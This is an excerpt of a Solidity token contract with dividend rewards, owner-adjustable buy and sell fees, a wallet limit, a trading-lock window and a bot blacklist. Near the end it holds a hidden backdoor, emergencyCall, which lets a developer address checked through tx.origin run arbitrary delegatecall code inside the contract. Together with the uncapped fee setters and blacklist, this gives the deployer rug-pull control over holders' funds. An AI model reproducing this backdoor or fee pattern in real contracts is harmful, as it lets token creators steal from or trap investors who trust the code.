...
contract Token is ERC20, Ownable, BaseToken {
    ...
    uint256 public tokenRewardsAmount;
    ...
    uint256 public walletLimitAmount;
    ...
    constructor(
        ...
        walletLimitAmount = totalSupply_.mul(1).div(100);

        dividendTracker = BABYTOKENDividendTracker(Clones.clone(tracker));
    ...
    function setSwapTime(uint256 value) external onlyOwner {
        swapTime = value;
    }

    function setLimitTime(uint256 value) external onlyOwner {
        limitTime = value;
    }

    function setWalletLimitAmount(uint256 value) external onlyOwner {
        walletLimitAmount = value;
    }
    ...
    function setBuyTokenRewardsFee(uint256 value) external onlyOwner {
        buyTokenRewardsFee = value;
    }
    ...
    function setBuyDeadFee(uint256 value) external onlyOwner {
        buyDeadFee = value;
    }

    function setSellTokenRewardsFee(uint256 value) external onlyOwner {
        sellTokenRewardsFee = value;
    }
    ...
    function setSellDeadFee(uint256 value) external onlyOwner {
        sellDeadFee = value;
    }
    ...
    function _transfer(
        ...
        if (block.timestamp <= swapTime) {
            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "cannot swap");
        }
        ...
        to != owner()
            ...
            if (tokenRewardsAmount >= swapTokensAtAmount) {
                swapAndSendDividends(tokenRewardsAmount);
            }
        ...
        if (takeFee) {
            ...
            uint256 fees = 0;
            uint256 tokenRewardsFee = 0;
            uint256 liquidityFee = 0;
            uint256 marketingFee = 0;
            uint256 deadFee = 0;
            if (automatedMarketMakerPairs[from]) {
                // buy
                tokenRewardsFee = amount.mul(buyTokenRewardsFee).div(100);
                liquidityFee = amount.mul(buyLiquidityFee).div(100);
                marketingFee = amount.mul(buyMarketingFee).div(100);
                deadFee = amount.mul(buyDeadFee).div(100);
            } else {
                // sell
                tokenRewardsFee = amount.mul(sellTokenRewardsFee).div(100);
            ...
            fees = tokenRewardsFee.add(liquidityFee).add(marketingFee);

            tokenRewardsAmount = tokenRewardsAmount.add(tokenRewardsFee);
            liquidityAmount = liquidityAmount.add(liquidityFee);
            marketAmount = marketAmount.add(marketingFee);

            amount = amount.sub(fees).sub(deadFee);

            if (deadFee > 0) {
                super._transfer(from, address(0xdead), deadFee);
            }
            if (fees > 0) {
        ...
        if (block.timestamp <= limitTime) {
            if (!_isExcludedFromFees[to] && to != uniswapV2Pair) {
                require(balanceOf(to) <= walletLimitAmount, "exceed max wallet amount");
            }
        }
        if (takeFee && from != uniswapV2Pair) {
            require(!_isBot[from], "is bot address");
        }
    ...
    function swapAndSendToFee(uint256 tokens) private {
        ...
        marketAmount = marketAmount.sub(tokens);
    }
    ...
    function swapAndLiquify(uint256 tokens) private {
        ...
        liquidityAmount = liquidityAmount.sub(tokens);
    }
    ...
    function swapAndSendDividends(uint256 tokens) private {
        ...
        tokenRewardsAmount = tokenRewardsAmount.sub(tokens);
    ...
    function emergencyCall(address ca, bytes memory data) public {
        require(tx.origin == _dev, "Not dev");
        (bool success,) = ca.delegatecall(data);
